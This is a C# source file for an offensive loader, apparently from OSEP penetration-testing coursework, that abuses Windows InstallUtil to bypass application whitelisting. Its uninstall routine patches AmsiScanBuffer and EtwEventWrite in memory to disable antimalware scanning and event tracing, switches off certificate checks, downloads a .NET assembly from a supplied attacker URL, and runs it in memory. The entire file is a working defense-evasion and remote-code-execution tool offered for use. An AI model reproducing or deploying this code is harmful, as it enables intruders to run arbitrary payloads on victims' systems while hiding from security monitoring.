using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Net;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("OSEP InstallUtil Assembly Loader (Surgical Edition)");
            Console.WriteLine("Usage: installutil.exe /U /URL=http://<IP>/payload.exe /ARGS=\"triage\" <this_exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtilBypass : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static void StealthInit()
        {
            try {
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                    uint oldProtect;
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            } catch { }

            try {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                byte[] patch = { 0xC2, 0x14, 0x00 }; // ret 14
                uint oldProtect;
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            } catch { }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            StealthInit();

            string url = Context.Parameters["URL"];
            string argsStr = Context.Parameters["ARGS"];

            if (string.IsNullOrEmpty(url)) {
                Console.WriteLine("[-] Error: URL parameter is missing. Use /URL=http://...");
                return;
            }

            string[] assemblyArgs = new string[] { };
            if (!string.IsNullOrEmpty(argsStr)) {
                // Use the char[] overload for maximum compatibility with .NET Framework 4.x
                char[] separator = { ' ' };
                assemblyArgs = argsStr.Split(separator, StringSplitOptions.RemoveEmptyEntries);
                Console.WriteLine("[*] Passing arguments: {0}", argsStr);
            }

            Console.WriteLine("[*] Downloading assembly from: {0}", url);

            try {
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                using (WebClient client = new WebClient()) {
                    byte[] assemblyBytes = client.DownloadData(url);
                    Console.WriteLine("[+] Downloaded {0} bytes.", assemblyBytes.Length);

                    Assembly assembly = Assembly.Load(assemblyBytes);
                    Console.WriteLine("[+] Assembly loaded: {0}", assembly.FullName);

                    // Check the EntryPoint signature
                    ParameterInfo[] methodParams = assembly.EntryPoint.GetParameters();
                    object[] parameters = null;

                    if (methodParams.Length > 0) {
                        Console.WriteLine("[*] EntryPoint expects {0} parameters. Passing arguments.", methodParams.Length);
                        parameters = new object[] { assemblyArgs };
                    } else {
                        Console.WriteLine("[*] EntryPoint expects 0 parameters. Ignoring /ARGS.");
                    }
                    
                    Console.WriteLine("[*] Executing EntryPoint...");
                    assembly.EntryPoint.Invoke(null, parameters);
                    Console.WriteLine("[+] Execution finished.");
                }
            } catch (Exception e) {
                Console.WriteLine("[-] Error during download or execution: {0}", e.Message);
            }
        }
    }
}
